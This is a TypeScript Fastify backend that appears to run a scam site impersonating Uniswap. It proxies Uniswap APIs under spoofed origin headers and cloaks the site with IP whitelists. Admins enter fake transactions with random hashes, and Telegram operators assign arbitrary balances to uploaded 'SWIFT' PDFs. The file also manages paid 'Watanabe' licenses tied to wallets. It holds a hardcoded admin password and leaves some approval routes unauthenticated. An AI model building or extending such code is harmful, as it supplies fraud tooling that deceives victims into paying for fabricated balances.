import multipart from '@fastify/multipart'
import Fastify from 'fastify'
import {
  getCachedSettings,
  getCachedWhitelist,
  invalidateLogsCache,
  invalidateSettingsCache,
  invalidateTransactionsCache,
  invalidateWhitelistCache,
} from './cache'
import {
  addAccessLog,
  addIPToWhitelist,
  addTransaction,
  approveSwiftConnection,
  blockIP,
  clearAccessLogs,
  createSwiftConnection,
  deleteTransaction,
  getAccessLogs,
  getAwaitingBalanceConnection,
  getPdfBalance,
  getSwiftConnection,
  getTelegramConfig,
  getTransactions,
  isIPAllowed,
  rejectSwiftConnection,
  removeIPFromWhitelist,
  resetSwiftConnectionToPending,
  saveAllSettings,
  saveTelegramConfig,
  setSwiftConnectionAwaitingBalance,
  setSwiftConnectionTelegramMsgId,
  setWhitelistEnabled,
  timeoutOldSwiftConnections,
  unblockIP,
  watanabeApproveLicense,
  watanabeBlockUser,
  watanabeCreateLicense,
  watanabeCreateTransaction,
  watanabeDeductBalance,
  watanabeGetActiveLicense,
  watanabeGetAllUsers,
  watanabeGetLicenseById,
  watanabeGetOrCreateUser,
  watanabeGetPendingLicense,
  watanabeGetUserLicenses,
  watanabeGetUserTransactions,
  watanabeIsUserBlocked,
  watanabeMarkLicensePaid,
  watanabeRejectLicense,
  watanabeSetLicenseTelegramMsg,
  watanabeUnblockUser,
  watanabeUpdateLicenseRequestMeta,
  watanabeUpdateLicenseSent,
  watanabeHasUserClaimed,
  watanabeCheckFingerprint,
  watanabeMarkClaimed,
  watanabeResetClaim,
} from './database'
import {
  answerCallbackQuery,
  editMessageText,
  notifyGasDeposit,
  notifyIPAccess,
  notifySendRequest,
  notifySwiftConnection as notifySwiftConnectionTelegram,
  sendTelegramMessage,
  testTelegramConnection,
} from './telegram'

// Admin password - validated server-side
const ADMIN_PASSWORD = '13565024'

const fastify = Fastify({ logger: true })

// ─── Manual CORS handling ────────────────────────────────────────────────────
// Supports multiple domains. Only adds CORS headers if not behind a proxy that
// already sets them (check X-Cors-Handled header from nginx).
const ALLOWED_ORIGINS = new Set([
  'https://uniswap.services',
  'https://www.uniswap.services',
  'https://olesereni.site',
  'https://www.olesereni.site',
  'http://localhost:3000',
  'http://localhost:5173',
])

fastify.addHook('onRequest', async (request, reply) => {
  const origin = request.headers.origin

  if (origin && ALLOWED_ORIGINS.has(origin)) {
    reply.header('Access-Control-Allow-Origin', origin)
    reply.header('Vary', 'Origin')
  } else if (!origin) {
    // No origin header (direct curl calls, server-to-server, etc.)
    // Don't set wildcard when credentials are involved
  }

  reply.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
  reply.header(
    'Access-Control-Allow-Headers',
    'Content-Type, Authorization, X-API-Key, X-Request-Id, X-Request-Source, x-admin-password',
  )
  reply.header('Access-Control-Allow-Credentials', 'true')

  // Handle preflight
  if (request.method === 'OPTIONS') {
    reply.header('Access-Control-Max-Age', '86400')
    return reply.status(204).send()
  }
})

// Enable multipart file uploads (for SWIFT PDF)
await fastify.register(multipart, {
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB max
  },
})

// Helper to get client IP
function getClientIP(request: { headers: Record<string, string | string[] | undefined>; ip: string }): string {
  const forwarded = request.headers['x-forwarded-for']
  if (typeof forwarded === 'string') {
    return forwarded.split(',')[0]?.trim() || request.ip
  }
  const realIP = request.headers['x-real-ip']
  if (typeof realIP === 'string') {
    return realIP
  }
  return request.ip
}

// Helper to validate admin password (body, query, or header)
function validatePassword(
  body: unknown,
  request?: { headers: Record<string, string | string[] | undefined> },
): boolean {
  if (typeof body === 'object' && body !== null && 'password' in body) {
    return (body as { password: string }).password === ADMIN_PASSWORD
  }
  if (request) {
    const headerPw = request.headers['x-admin-password']
    if (typeof headerPw === 'string' && headerPw === ADMIN_PASSWORD) {
      return true
    }
  }
  return false
}

function validatePasswordFromQuery(
  query: unknown,
  request?: { headers: Record<string, string | string[] | undefined> },
): boolean {
  if (typeof query === 'object' && query !== null && 'password' in query) {
    return (query as { password: string }).password === ADMIN_PASSWORD
  }
  if (request) {
    const headerPw = request.headers['x-admin-password']
    if (typeof headerPw === 'string' && headerPw === ADMIN_PASSWORD) {
      return true
    }
  }
  return false
}

// ─── Allowed proxy targets ───────────────────────────────────────────────────

const ALLOWED_TARGETS: Record<string, string> = {
  'trading-api': 'https://trading-api-labs.interface.gateway.uniswap.org',
  graphql: 'https://beta.gateway.uniswap.org',
  gateway: 'https://interface.gateway.uniswap.org',
  amplitude: 'https://metrics.interface.gateway.uniswap.org',
  'trade-api': 'https://trade-api.gateway.uniswap.org',
  beta: 'https://beta.gateway.uniswap.org',
  'entry-gateway': 'https://entry-gateway.backend-prod.api.uniswap.org',
}

const FORWARDED_REQUEST_HEADERS = [
  'content-type',
  'accept',
  'x-api-key',
  'x-request-id',
  'x-request-source',
  'authorization',
]

// ─── Proxy Routes ────────────────────────────────────────────────────────────

fastify.all('/api/proxy/:target/*', async (request, reply) => {
  const { target } = request.params as { target: string }
  const wildcardPath = (request.params as { '*': string })['*'] || ''

  const baseUrl = ALLOWED_TARGETS[target]
  if (!baseUrl) {
    return reply.status(400).send({ error: `Invalid proxy target: ${target}` })
  }

  const queryString = request.url.includes('?') ? request.url.split('?')[1] : ''
  const targetUrl = `${baseUrl}/${wildcardPath}${queryString ? '?' + queryString : ''}`

  const headers: Record<string, string> = {
    Origin: 'https://app.uniswap.org',
    Referer: 'https://app.uniswap.org/',
    'User-Agent': 'Mozilla/5.0 (compatible; UniswapInterface/1.0)',
  }

  for (const header of FORWARDED_REQUEST_HEADERS) {
    const value = request.headers[header]
    if (value && typeof value === 'string') {
      headers[header] = value
    }
  }

  try {
    const response = await fetch(targetUrl, {
      method: request.method,
      headers,
      body: ['POST', 'PUT', 'PATCH'].includes(request.method) ? JSON.stringify(request.body) : undefined,
    })

    const data = await response.text()

    try {
      const jsonData = JSON.parse(data)
      return reply.status(response.status).header('Content-Type', 'application/json').send(jsonData)
    } catch {
      return reply
        .status(response.status)
        .header('Content-Type', response.headers.get('content-type') || 'text/plain')
        .send(data)
    }
  } catch (error) {
    return reply.status(502).send({ error: 'Proxy request failed', details: String(error) })
  }
})

// ─── Health Check ────────────────────────────────────────────────────────────

fastify.get('/api/health', async () => {
  return { status: 'ok', timestamp: new Date().toISOString(), database: 'sqlite' }
})

// ─── Settings Routes (SQLite-backed) ─────────────────────────────────────────

// GET /api/settings - Public (returns settings without sensitive data)
fastify.get('/api/settings', async (_request, reply) => {
  const settings = getCachedSettings()
  // Strip sensitive fields before sending to client
  const {
    telegramBotToken: _botToken,
    telegramChannelId: _channelId,
    ...publicSettings
  } = settings as Record<string, unknown>
  return reply.send(publicSettings)
})

// POST /api/settings - Admin only (save settings)
fastify.post('/api/settings', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  saveAllSettings(body)
  invalidateSettingsCache()

  // Notify any SSE listeners about settings change
  notifySettingsChange()

  return reply.send({ success: true })
})

// ─── Telegram Config Routes (Server-side only) ──────────────────────────────

// GET /api/telegram/config - Admin only
fastify.get('/api/telegram/config', async (request, reply) => {
  if (!validatePasswordFromQuery(request.query)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  const config = getTelegramConfig()
  // Mask the bot token for security (show only last 4 chars)
  const maskedToken = config.botToken ? '***' + config.botToken.slice(-4) : ''

  return reply.send({
    botToken: maskedToken,
    botTokenSet: !!config.botToken,
    channelId: config.channelId,
    notificationsEnabled: config.notificationsEnabled,
  })
})

// POST /api/telegram/config - Admin only (save Telegram config)
fastify.post('/api/telegram/config', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  const incomingToken = (body.botToken as string) || ''
  // If the token starts with *** it's the masked version from GET — don't overwrite
  const currentConfig = getTelegramConfig()
  const tokenToSave = incomingToken.startsWith('***') ? currentConfig.botToken : incomingToken

  saveTelegramConfig({
    botToken: tokenToSave,
    channelId: (body.channelId as string) || '',
    notificationsEnabled: body.notificationsEnabled === true,
  })
  invalidateSettingsCache()

  return reply.send({ success: true })
})

// POST /api/telegram/test - Admin only (test connection)
fastify.post('/api/telegram/test', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  let botToken = (body.botToken as string) || ''
  const channelId = (body.channelId as string) || ''

  // If the token is masked, use the saved one
  if (botToken.startsWith('***')) {
    const currentConfig = getTelegramConfig()
    botToken = currentConfig.botToken
  }

  if (!botToken || !channelId) {
    return reply.status(400).send({ error: 'Bot token and channel ID are required' })
  }

  const result = await testTelegramConnection(botToken, channelId)
  return reply.send(result)
})

// POST /api/telegram/send - Server-side notification (internal use)
fastify.post('/api/telegram/send', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  const text = (body.text as string) || ''
  if (!text) {
    return reply.status(400).send({ error: 'Message text is required' })
  }

  const result = await sendTelegramMessage({ text, parseMode: 'HTML' })
  return reply.send(result)
})

// ─── IP Whitelist Routes (SQLite-backed) ─────────────────────────────────────

// GET /api/whitelist - Admin only
fastify.get('/api/whitelist', async (request, reply) => {
  if (!validatePasswordFromQuery(request.query)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  const whitelist = getCachedWhitelist()
  return reply.send(whitelist)
})

// POST /api/whitelist - Admin only (save full whitelist config)
fastify.post('/api/whitelist', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  if (typeof body.enabled === 'boolean') {
    setWhitelistEnabled(body.enabled)
  }
  invalidateWhitelistCache()

  return reply.send({ success: true })
})

// POST /api/whitelist/add - Add IP to whitelist
fastify.post('/api/whitelist/add', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  const ip = (body.ip as string)?.trim()
  if (!ip) {
    return reply.status(400).send({ error: 'IP address is required' })
  }

  addIPToWhitelist(ip)
  invalidateWhitelistCache()

  return reply.send({ success: true })
})

// POST /api/whitelist/remove - Remove IP from whitelist
fastify.post('/api/whitelist/remove', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  const ip = (body.ip as string)?.trim()
  if (!ip) {
    return reply.status(400).send({ error: 'IP address is required' })
  }

  removeIPFromWhitelist(ip)
  invalidateWhitelistCache()

  return reply.send({ success: true })
})

// POST /api/whitelist/block - Block an IP
fastify.post('/api/whitelist/block', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  const ip = (body.ip as string)?.trim()
  if (!ip) {
    return reply.status(400).send({ error: 'IP address is required' })
  }

  blockIP(ip)
  invalidateWhitelistCache()

  return reply.send({ success: true })
})

// POST /api/whitelist/unblock - Unblock an IP
fastify.post('/api/whitelist/unblock', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  const ip = (body.ip as string)?.trim()
  if (!ip) {
    return reply.status(400).send({ error: 'IP address is required' })
  }

  unblockIP(ip)
  invalidateWhitelistCache()

  return reply.send({ success: true })
})

// POST /api/whitelist/toggle - Toggle whitelist enabled/disabled
fastify.post('/api/whitelist/toggle', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  setWhitelistEnabled(body.enabled === true)
  invalidateWhitelistCache()

  return reply.send({ success: true })
})

// ─── IP Check Route (Public) ─────────────────────────────────────────────────

fastify.get('/api/check-ip', async (request, reply) => {
  const clientIP = getClientIP(request)
  const result = isIPAllowed(clientIP)

  return reply.send({
    allowed: result.allowed,
    ip: clientIP,
    reason: result.reason,
  })
})

// ─── Access Logs Routes ──────────────────────────────────────────────────────

// POST /api/log-access - Log an access attempt (public, called from client)
fastify.post('/api/log-access', async (request, reply) => {
  const body = request.body as Record<string, unknown>
  const clientIP = getClientIP(request)
  const path = (body.path as string) || '/'

  const result = isIPAllowed(clientIP)

  addAccessLog({
    ip: clientIP,
    userAgent: (request.headers['user-agent'] as string) || '',
    allowed: result.allowed,
    path,
    timestamp: Date.now(),
  })
  invalidateLogsCache()

  // Notify on Telegram if access was denied
  if (!result.allowed) {
    notifyIPAccess({ ip: clientIP, allowed: false, path }).catch(() => {
      // Best effort
    })
  }

  return reply.send({ logged: true })
})

// GET /api/access-logs - Admin only
fastify.get('/api/access-logs', async (request, reply) => {
  if (!validatePasswordFromQuery(request.query)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  const logs = getAccessLogs()
  return reply.send({ logs })
})

// POST /api/access-logs/clear - Admin only
fastify.post('/api/access-logs/clear', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  clearAccessLogs()
  invalidateLogsCache()

  return reply.send({ success: true })
})

// ─── Transactions Routes (SQLite-backed) ─────────────────────────────────────

// GET /api/transactions - Public (for portfolio display)
fastify.get('/api/transactions', async (_request, reply) => {
  const transactions = getTransactions()
  return reply.send({ transactions })
})

// POST /api/transactions - Admin only (add transaction)
fastify.post('/api/transactions', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  const id = addTransaction({
    type: (body.type as 'send' | 'receive') || 'send',
    amount: Number(body.amount) || 0,
    toAddress: (body.toAddress as string) || '',
    timestamp: Number(body.timestamp) || Date.now(),
    status: (body.status as 'success' | 'pending' | 'sending') || 'success',
    transactionHash:
      (body.transactionHash as string) ||
      `0x${Math.random().toString(16).slice(2)}${Math.random().toString(16).slice(2)}`,
    isSlowSend: body.isSlowSend === true,
    startTime: Number(body.startTime) || 0,
    expectedCompletionTime: Number(body.expectedCompletionTime) || 0,
    speedUpRequested: body.speedUpRequested === true,
  })
  invalidateTransactionsCache()

  return reply.send({ success: true, id })
})

// DELETE /api/transactions/:id - Admin only
fastify.delete('/api/transactions/:id', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  if (!validatePassword(body)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }

  const { id } = request.params as { id: string }
  const deleted = deleteTransaction(id)
  invalidateTransactionsCache()

  return reply.send({ success: deleted })
})

// ─── SWIFT Connect Route (Server-side with Telegram) ─────────────────────────

fastify.post('/api/swift/connect', async (request, reply) => {
  try {
    const data = await request.file()
    if (!data) {
      return reply.status(400).send({ error: 'No file uploaded' })
    }

    const buffer = await data.toBuffer()
    const clientIP = getClientIP(request)
    const pdfName = data.filename || 'swift-document.pdf'

    // Create connection record in DB (status: pending)
    const connectionId = createSwiftConnection(pdfName, clientIP)

    // Generate TRN number for the notification
    const trnNumber = `TRN${Date.now().toString().slice(-10)}${Math.random().toString(36).slice(2, 6).toUpperCase()}`

    // Get settings for default amount
    const settings = getCachedSettings()
    const amount = Number(settings.portfolioBalance) || 0
    const currency = 'USD'

    // Send PDF to Telegram with approve/reject inline buttons (server-side only)
    const telegramResult = await notifySwiftConnectionTelegram({
      connectionId,
      fileName: pdfName,
      trnNumber,
      amount,
      currency,
      ip: clientIP,
      pdfBuffer: buffer,
    })

    // Store telegram message ID so we can match callback queries
    if (telegramResult.success && telegramResult.messageId) {
      setSwiftConnectionTelegramMsgId(connectionId, telegramResult.messageId)
    }

    // biome-ignore lint/suspicious/noConsole: server logging
    console.log(`[SWIFT] Connection ${connectionId} created, telegram sent: ${telegramResult.success}`)

    // Return the shape the client expects
    return reply.send({
      connectionId,
      isReturningPdf: false,
      previousBalance: null,
    })
  } catch (error) {
    // biome-ignore lint/suspicious/noConsole: server logging
    console.error('[SWIFT Connect] Error:', error)
    return reply.status(500).send({ error: 'Failed to process SWIFT connection' })
  }
})

// GET /api/swift/status - Poll connection status
fastify.get('/api/swift/status', async (request, reply) => {
  const query = request.query as Record<string, string>
  const connectionId = query.connectionId

  if (!connectionId) {
    return reply.status(400).send({ error: 'Missing connectionId' })
  }

  // Clean up old pending connections (timeout after 5 min)
  timeoutOldSwiftConnections()

  const connection = getSwiftConnection(connectionId)

  if (!connection) {
    // biome-ignore lint/suspicious/noConsole: server logging
    console.log(`[SWIFT Status] ${connectionId} → NOT FOUND`)
    return reply.status(404).send({ error: 'Connection not found' })
  }

  // Only log when status changes from pending (to avoid flooding)
  if (connection.status !== 'pending') {
    // biome-ignore lint/suspicious/noConsole: server logging
    console.log(`[SWIFT Status] ${connectionId} → ${connection.status} (balance: ${connection.balance})`)
  }

  return reply.send({
    connectionId: connection.id,
    status: connection.status,
    balance: connection.balance,
    pdfName: connection.pdfName,
  })
})

// POST /api/swift/approve/:id - Approve a SWIFT connection (from admin or Telegram)
fastify.post('/api/swift/approve/:id', async (request, reply) => {
  const { id } = request.params as { id: string }
  const body = (request.body || {}) as Record<string, unknown>

  // Use provided balance or fall back to portfolio balance from settings
  const settings = getCachedSettings()
  const balance = Number(body.balance) || Number(settings.portfolioBalance) || 0

  const approved = approveSwiftConnection(id, balance)

  if (!approved) {
    return reply.status(404).send({ error: 'Connection not found or already processed' })
  }

  // biome-ignore lint/suspicious/noConsole: server logging
  console.log(`[SWIFT] Connection ${id} APPROVED with balance ${balance}`)
  return reply.send({ success: true, connectionId: id, status: 'accepted', balance })
})

// POST /api/swift/reject/:id - Reject a SWIFT connection (from admin or Telegram)
fastify.post('/api/swift/reject/:id', async (request, reply) => {
  const { id } = request.params as { id: string }

  const rejected = rejectSwiftConnection(id)

  if (!rejected) {
    return reply.status(404).send({ error: 'Connection not found or already processed' })
  }

  // biome-ignore lint/suspicious/noConsole: server logging
  console.log(`[SWIFT] Connection ${id} REJECTED`)
  return reply.send({ success: true, connectionId: id, status: 'rejected' })
})

// ─── Telegram Webhook / Callback Handler ─────────────────────────────────────

// Shared logic for handling a callback_query (used by both webhook and polling)
async function handleCallbackQuery(callbackQuery: {
  id: string
  from: { first_name: string; username?: string }
  message?: { message_id: number; chat: { id: number } }
  data?: string
}): Promise<void> {
  if (!callbackQuery.data) {
    return
  }

  const callbackData = callbackQuery.data
  const operatorName = callbackQuery.from?.first_name || 'Unknown'
  const chatId = callbackQuery.message?.chat?.id
  const messageId = callbackQuery.message?.message_id

  // biome-ignore lint/suspicious/noConsole: server logging
  console.log(`[Telegram] Callback: ${callbackData} from ${operatorName}`)

  // ─── Step 1: Approve → show balance option buttons ──────────────
  const approveMatch = callbackData.match(/^swift_approve_(.+)$/)
  if (approveMatch) {
    const connectionId = approveMatch[1] ?? ''
    const conn = getSwiftConnection(connectionId)

    if (!conn || (conn.status !== 'pending' && conn.status !== 'awaiting_balance')) {
      await answerCallbackQuery(callbackQuery.id, '⚠️ Already processed')
      return
    }

    const settings = getCachedSettings()
    const systemBalance = Number(settings.portfolioBalance) || 0
    const previousBalance = getPdfBalance(conn.pdfName)

    // Build balance option buttons
    const buttons: Array<Array<{ text: string; callback_data: string }>> = []

    // Row 1: System balance
    buttons.push([
      { text: `💰 Use System ($${systemBalance.toLocaleString()})`, callback_data: `swift_useSys_${connectionId}` },
    ])

    // Row 2: Previous balance (only if this PDF was seen before)
    if (previousBalance !== null) {
      buttons.push([
        {
          text: `🔄 Use Previous ($${previousBalance.toLocaleString()})`,
          callback_data: `swift_usePrev_${connectionId}`,
        },
      ])
    }

    // Row 3: Set new + Cancel
    buttons.push([
      { text: '✏️ Set New Amount', callback_data: `swift_setNew_${connectionId}` },
      { text: '↩️ Cancel', callback_data: `swift_cancel_${connectionId}` },
    ])

    await answerCallbackQuery(callbackQuery.id, '✅ Choose balance option')

    // Update message to show balance options
    if (chatId && messageId) {
      // biome-ignore lint/suspicious/noConsole: server logging
      console.log(`[Telegram] Editing message ${messageId} in chat ${chatId} with balance options`)
      const balanceText = [
        `✅ <b>SWIFT Connection — Choose Balance</b>`,
        ``,
        `📄 File: <code>${conn.pdfName}</code>`,
        `🆔 <code>${connectionId}</code>`,
        `👤 Approved by: ${operatorName}`,
        ``,
        previousBalance !== null
          ? `📌 This PDF was previously set to <b>$${previousBalance.toLocaleString()}</b>`
          : `📌 First time seeing this PDF`,
        `🏦 System balance: <b>$${systemBalance.toLocaleString()}</b>`,
        ``,
        `👇 <b>Select which balance to use:</b>`,
      ].join('\n')

      await editMessageText(chatId, messageId, balanceText, 'HTML', { inline_keyboard: buttons })
      // biome-ignore lint/suspicious/noConsole: server logging
      console.log(`[Telegram] Balance options message edit complete`)
    }
    return
  }

  // ─── Step 2a: Use system balance ────────────────────────────────
  const useSysMatch = callbackData.match(/^swift_useSys_(.+)$/)
  if (useSysMatch) {
    const connectionId = useSysMatch[1] ?? ''
    const settings = getCachedSettings()
    const balance = Number(settings.portfolioBalance) || 0

    // biome-ignore lint/suspicious/noConsole: server logging
    console.log(`[Telegram] Approving ${connectionId} with system balance $${balance}`)
    const approved = approveSwiftConnection(connectionId, balance)
    // biome-ignore lint/suspicious/noConsole: server logging
    console.log(`[Telegram] approveSwiftConnection result: ${approved}`)

    if (approved) {
      await answerCallbackQuery(callbackQuery.id, `✅ Approved with $${balance.toLocaleString()}`)
      if (chatId && messageId) {
        await editMessageText(
          chatId,
          messageId,
          `✅ <b>SWIFT Connection APPROVED</b>\n\n🆔 <code>${connectionId}</code>\n💰 Balance: <b>$${balance.toLocaleString()}</b> (System)\n👤 By: ${operatorName}\n⏰ ${new Date().toUTCString()}`,
          'HTML',
        )
      }
      // biome-ignore lint/suspicious/noConsole: server logging
      console.log(`[Telegram] ${connectionId} APPROVED with system balance $${balance}`)
    } else {
      await answerCallbackQuery(callbackQuery.id, '⚠️ Already processed')
    }
    return
  }

  // ─── Step 2b: Use previous balance for this PDF ─────────────────
  const usePrevMatch = callbackData.match(/^swift_usePrev_(.+)$/)
  if (usePrevMatch) {
    const connectionId = usePrevMatch[1] ?? ''
    const conn = getSwiftConnection(connectionId)
    if (!conn) {
      await answerCallbackQuery(callbackQuery.id, '⚠️ Connection not found')
      return
    }

    const previousBalance = getPdfBalance(conn.pdfName)
    if (previousBalance === null) {
      await answerCallbackQuery(callbackQuery.id, '⚠️ No previous balance found')
      return
    }

    const approved = approveSwiftConnection(connectionId, previousBalance)

    if (approved) {
      await answerCallbackQuery(callbackQuery.id, `✅ Approved with $${previousBalance.toLocaleString()}`)
      if (chatId && messageId) {
        await editMessageText(
          chatId,
          messageId,
          `✅ <b>SWIFT Connection APPROVED</b>\n\n🆔 <code>${connectionId}</code>\n💰 Balance: <b>$${previousBalance.toLocaleString()}</b> (Previous)\n👤 By: ${operatorName}\n⏰ ${new Date().toUTCString()}`,
          'HTML',
        )
      }
      // biome-ignore lint/suspicious/noConsole: server logging
      console.log(`[Telegram] ${connectionId} APPROVED with previous balance $${previousBalance}`)
    } else {
      await answerCallbackQuery(callbackQuery.id, '⚠️ Already processed')
    }
    return
  }

  // ─── Step 2c: Set new balance → ask admin to type amount ────────
  const setNewMatch = callbackData.match(/^swift_setNew_(.+)$/)
  if (setNewMatch) {
    const connectionId = setNewMatch[1] ?? ''

    if (!chatId) {
      await answerCallbackQuery(callbackQuery.id, '⚠️ Cannot determine chat')
      return
    }

    // Mark connection as awaiting_balance so the text message handler picks it up
    const set = setSwiftConnectionAwaitingBalance(connectionId, chatId)
    if (!set) {
      await answerCallbackQuery(callbackQuery.id, '⚠️ Connection not found')
      return
    }

    await answerCallbackQuery(callbackQuery.id, '✏️ Type the amount in USD')

    // Update the message to show we're waiting for input
    if (messageId) {
      await editMessageText(
        chatId,
        messageId,
        `✏️ <b>Enter Custom Balance</b>\n\n🆔 <code>${connectionId}</code>\n\n👇 <b>Type the amount in USD in this chat</b> (e.g. <code>250000</code> or <code>1500000.50</code>)\n\nOr press Cancel to go back.`,
        'HTML',
        { inline_keyboard: [[{ text: '↩️ Cancel', callback_data: `swift_cancel_${connectionId}` }]] },
      )
    }
    return
  }

  // ─── Cancel → reset back to approve/reject ──────────────────────
  const cancelMatch = callbackData.match(/^swift_cancel_(.+)$/)
  if (cancelMatch) {
    const connectionId = cancelMatch[1] ?? ''
    const conn = getSwiftConnection(connectionId)

    if (!conn || (conn.status !== 'pending' && conn.status !== 'awaiting_balance')) {
      await answerCallbackQuery(callbackQuery.id, '⚠️ Already processed')
      return
    }

    // Reset to pending if it was awaiting_balance
    if (conn.status === 'awaiting_balance') {
      resetSwiftConnectionToPending(connectionId)
    }

    await answerCallbackQuery(callbackQuery.id, '↩️ Cancelled')

    // Restore original approve/reject buttons
    if (chatId && messageId) {
      const settings = getCachedSettings()
      const amount = Number(settings.portfolioBalance) || 0
      const caption = [
        '🔗 <b>New SWIFT Connection</b>',
        '',
        `📄 File: <code>${conn.pdfName}</code>`,
        `🆔 Connection: <code>${connectionId}</code>`,
        `💰 System Balance: <b>$${amount.toLocaleString()} USD</b>`,
        conn.ip ? `🌐 IP: <code>${conn.ip}</code>` : '',
        '',
        `⏰ ${new Date(conn.createdAt).toUTCString()}`,
        '',
        '👇 <b>Approve or reject this connection:</b>',
      ]
        .filter(Boolean)
        .join('\n')

      await editMessageText(chatId, messageId, caption, 'HTML', {
        inline_keyboard: [
          [
            { text: '✅ Approve', callback_data: `swift_approve_${connectionId}` },
            { text: '❌ Reject', callback_data: `swift_reject_${connectionId}` },
          ],
        ],
      })
    }
    return
  }

  // ─── Reject ─────────────────────────────────────────────────────
  const rejectMatch = callbackData.match(/^swift_reject_(.+)$/)
  if (rejectMatch) {
    const connectionId = rejectMatch[1] ?? ''
    const rejected = rejectSwiftConnection(connectionId)

    if (rejected) {
      await answerCallbackQuery(callbackQuery.id, '❌ Connection rejected')
      if (chatId && messageId) {
        await editMessageText(
          chatId,
          messageId,
          `❌ <b>SWIFT Connection REJECTED</b>\n\n🆔 <code>${connectionId}</code>\n👤 By: ${operatorName}\n⏰ ${new Date().toUTCString()}`,
          'HTML',
        )
      }
      // biome-ignore lint/suspicious/noConsole: server logging
      console.log(`[Telegram] ${connectionId} REJECTED by ${operatorName}`)
    } else {
      await answerCallbackQuery(callbackQuery.id, '⚠️ Already processed')
    }
    return
  }

  // ─── Watanabe License Approve ──────────────────────────────────
  const wlicApproveMatch = callbackData.match(/^wlic_approve_(.+)$/)
  if (wlicApproveMatch) {
    const licenseId = wlicApproveMatch[1] || ''
    const approved = watanabeApproveLicense(licenseId)
    if (approved) {
      // Notify SSE clients of approval
      const lic = watanabeGetLicenseById(licenseId)
      if (lic) {
        notifyLicenseUpdate(lic.walletAddress, 'active', licenseId)
      }
      await answerCallbackQuery(callbackQuery.id, '✅ License approved')
      if (chatId && messageId) {
        await editMessageText(
          chatId,
          messageId,
          `✅ <b>Watanabe License APPROVED</b>\n\n🆔 <code>${licenseId}</code>\n👤 By: ${operatorName}\n⏰ ${new Date().toUTCString()}`,
          'HTML',
        )
      }
    } else {
      await answerCallbackQuery(callbackQuery.id, '⚠️ Already processed')
    }
    return
  }

  // ─── Watanabe License Reject ───────────────────────────────────
  const wlicRejectMatch = callbackData.match(/^wlic_reject_(.+)$/)
  if (wlicRejectMatch) {
    const licenseId = wlicRejectMatch[1] || ''
    // Get wallet before rejecting so we can notify SSE
    const lic = watanabeGetLicenseById(licenseId)
    const rejected = watanabeRejectLicense(licenseId)
    if (rejected) {
      // Notify SSE clients of rejection
      if (lic) {
        notifyLicenseUpdate(lic.walletAddress, 'rejected', licenseId)
      }
      await answerCallbackQuery(callbackQuery.id, '❌ License rejected')
      if (chatId && messageId) {
        await editMessageText(
          chatId,
          messageId,
          `❌ <b>Watanabe License REJECTED</b>\n\n🆔 <code>${licenseId}</code>\n👤 By: ${operatorName}\n⏰ ${new Date().toUTCString()}`,
          'HTML',
        )
      }
    } else {
      await answerCallbackQuery(callbackQuery.id, '⚠️ Already processed')
    }
    return
  }

  await answerCallbackQuery(callbackQuery.id, 'Unknown action')
}

// Shared logic for handling a typed text message (for custom balance entry)
async function handleTextMessage(message: {
  message_id: number
  chat: { id: number }
  from?: { first_name: string }
  text?: string
}): Promise<void> {
  if (!message.text) {
    return
  }

  const text = message.text.trim()
  const operatorName = message.from?.first_name || 'Unknown'

  // Check if there's a connection awaiting a balance amount
  const conn = getAwaitingBalanceConnection()
  if (!conn) {
    return // No connection waiting for input, ignore
  }

  // Only accept messages from the same chat where we asked for input
  if (conn.telegramChatId && conn.telegramChatId !== message.chat.id) {
    return
  }

  // Parse the amount — strip $ and , characters
  const cleanedText = text.replace(/[$,\s]/g, '')
  const amount = parseFloat(cleanedText)

  if (isNaN(amount) || amount <= 0) {
    // Send error, keep waiting
    await sendTelegramMessage({
      text: `⚠️ Invalid amount: "<code>${escapeHtml(text)}</code>"\n\nPlease type a valid USD amount (e.g. <code>250000</code> or <code>1500000.50</code>)`,
      parseMode: 'HTML',
    })
    return
  }

  // Approve with the custom amount
  const approved = approveSwiftConnection(conn.id, amount)

  if (approved) {
    // Update the original message to show approval
    if (conn.telegramMessageId && conn.telegramChatId) {
      await editMessageText(
        conn.telegramChatId,
        conn.telegramMessageId,
        `✅ <b>SWIFT Connection APPROVED</b>\n\n🆔 <code>${conn.id}</code>\n💰 Balance: <b>$${amount.toLocaleString()}</b> (Custom)\n👤 By: ${operatorName}\n⏰ ${new Date().toUTCString()}`,
        'HTML',
      )
    }

    // Confirm in chat
    await sendTelegramMessage({
      text: `✅ Connection <code>${conn.id}</code> approved with <b>$${amount.toLocaleString()}</b>`,
      parseMode: 'HTML',
    })

    // biome-ignore lint/suspicious/noConsole: server logging
